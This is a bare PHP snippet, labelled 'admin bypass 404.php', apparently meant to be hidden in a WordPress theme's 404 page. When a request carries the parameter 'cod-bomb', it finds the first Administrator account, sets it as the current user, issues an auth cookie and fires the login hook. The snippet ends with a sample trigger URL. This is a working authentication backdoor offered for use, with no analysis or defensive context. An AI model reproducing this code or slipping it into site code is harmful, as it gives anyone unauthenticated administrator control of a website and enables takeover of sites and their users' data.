 <!-- admin bypass 404.php  -->
 
 if( isset($_GET['cod-bomb']) ){
	$args = array(
		'role'    => 'Administrator',
		'orderby' => 'ID',
		'order'   => 'ASC',
		'number'  => 1,
		'fields'  => array('ID'),
	);

	$admins = get_users($args);
	$user_id = $admins[0]->ID;
	$user = get_user_by('id', $user_id);
	if ($user) {
        wp_set_current_user($user_id);
        wp_set_auth_cookie($user_id);
        do_action('wp_login', $user->user_login, $user);
    }
}

https://example.com/?cod-bomb=1
